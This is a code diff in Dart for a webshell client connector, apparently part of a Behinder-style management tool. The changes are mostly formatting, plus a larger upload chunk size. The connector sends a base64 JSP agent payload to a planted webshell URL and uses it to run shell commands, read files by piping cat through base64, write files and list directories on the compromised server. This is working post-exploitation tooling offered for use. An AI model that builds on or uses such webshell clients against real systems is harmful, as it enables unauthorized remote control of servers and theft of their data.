@@ -30,11 +30,11 @@ class JspClassloaderConnector extends ShellConnector {
 
   @override
   Set<ConnectorCapability> get capabilities => const {
-        ConnectorCapability.codeExec,
-        ConnectorCapability.shellExec,
-        ConnectorCapability.fileRead,
-        ConnectorCapability.fileWrite,
-      };
+    ConnectorCapability.codeExec,
+    ConnectorCapability.shellExec,
+    ConnectorCapability.fileRead,
+    ConnectorCapability.fileWrite,
+  };
 
   /// 严格 percent-encode（防止 Tomcat 将 `+` 解码为空格破坏 Base64）
   static String _formEncode(String s) {
@@ -49,8 +49,7 @@ class JspClassloaderConnector extends ShellConnector {
           cu == 0x7E) {
         buf.writeCharCode(cu);
       } else {
-        buf.write(
-            '%${cu.toRadixString(16).padLeft(2, '0').toUpperCase()}');
+        buf.write('%${cu.toRadixString(16).padLeft(2, '0').toUpperCase()}');
       }
     }
     return buf.toString();
@@ -64,12 +63,13 @@ class JspClassloaderConnector extends ShellConnector {
       final uri = Uri.parse(webshell.url);
       String payload;
       try {
-        payload =
-            (await rootBundle.loadString('data/jsp_agent_M.b64')).trim();
+        payload = (await rootBundle.loadString('data/jsp_agent_M.b64')).trim();
       } catch (_) {
         try {
           final file = io.File('data/jsp_agent_M.b64');
-          payload = await file.exists() ? (await file.readAsString()).trim() : '';
+          payload = await file.exists()
+              ? (await file.readAsString()).trim()
+              : '';
         } catch (_) {
           payload = '';
         }
@@ -82,8 +82,9 @@ class JspClassloaderConnector extends ShellConnector {
       final bodyParts = <String>[
         '${_formEncode(paramName)}=${_formEncode(payload)}',
         'a=${_formEncode(action)}',
-        ...extraParams.entries
-            .map((e) => '${_formEncode(e.key)}=${_formEncode(e.value)}'),
+        ...extraParams.entries.map(
+          (e) => '${_formEncode(e.key)}=${_formEncode(e.value)}',
+        ),
       ];
 
       final response = await http
@@ -98,7 +99,9 @@ class JspClassloaderConnector extends ShellConnector {
         return decodeWithFallback(response.bodyBytes);
       }
       final body = decodeWithFallback(response.bodyBytes);
-      final snippet = body.length > 4096 ? '${body.substring(0, 4096)}...' : body;
+      final snippet = body.length > 4096
+          ? '${body.substring(0, 4096)}...'
+          : body;
       return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
     } on TimeoutException {
       return '[Timeout] 连接超时';
@@ -130,8 +133,10 @@ class JspClassloaderConnector extends ShellConnector {
     final cd = (workingDir.isNotEmpty && workingDir.startsWith('/'))
         ? 'cd ${_sq(workingDir)} && '
         : '';
-    final r = await _sendJsp('exec',
-        extraParams: {'_k': _execKey, _execKey: '$cd$cmd'});
+    final r = await _sendJsp(
+      'exec',
+      extraParams: {'_k': _execKey, _execKey: '$cd$cmd'},
+    );
     return r.trim();
   }
 
@@ -189,10 +194,10 @@ class JspClassloaderConnector extends ShellConnector {
 
   @override
   Future<bool> writeFile(String path, String content) async {
-    final r = await _sendJsp('write', extraParams: {
-      'path': path,
-      'data': base64.encode(utf8.encode(content)),
-    });
+    final r = await _sendJsp(
+      'write',
+      extraParams: {'path': path, 'data': base64.encode(utf8.encode(content))},
+    );
     return r.trim() == '1';
   }
 
@@ -208,8 +213,10 @@ class JspClassloaderConnector extends ShellConnector {
     final cmd =
         'cat ${_sq(path)} 2>/dev/null | base64 -w0 2>/dev/null'
         " || cat ${_sq(path)} 2>/dev/null | base64";
-    final result = await _sendJsp('exec',
-        extraParams: {'_k': _execKey, _execKey: cmd});
+    final result = await _sendJsp(
+      'exec',
+      extraParams: {'_k': _execKey, _execKey: cmd},
+    );
     final b64 = result.trim().replaceAll(RegExp(r'\s'), '');
     if (b64.isEmpty || b64.startsWith('[')) {
       throw Exception('无法读取文件: $b64');
@@ -228,7 +235,7 @@ class JspClassloaderConnector extends ShellConnector {
   }
 
   // 分块大小：与 JSP 冰蝎保持一致，使用较小块减少单次命令长度。
-  static const _kChunkSize = 1 * 1024;
+  static const _kChunkSize = 64 * 1024;
 
   @override
   Future<bool> writeFileBinaryWithProgress(
@@ -270,10 +277,12 @@ class JspClassloaderConnector extends ShellConnector {
       final idx = line.indexOf('|');
       if (idx > 0) {
         try {
-          final key =
-              decodeWithFallback(base64.decode(line.substring(0, idx).trim()));
-          final val =
-              decodeWithFallback(base64.decode(line.substring(idx + 1).trim()));
+          final key = decodeWithFallback(
+            base64.decode(line.substring(0, idx).trim()),
+          );
+          final val = decodeWithFallback(
+            base64.decode(line.substring(idx + 1).trim()),
+          );
           map[key] = val;
         } catch (_) {}
       }
@@ -283,7 +292,8 @@ class JspClassloaderConnector extends ShellConnector {
 
   @override
   Future<List<({String name, bool isDir})>> listNamesForCompletion(
-      String path) async {
+    String path,
+  ) async {
     final result = await _sendJsp('ls', extraParams: {'path': path});
     if (result.isEmpty || result.startsWith('[')) return [];
     final out = <({String name, bool isDir})>[];
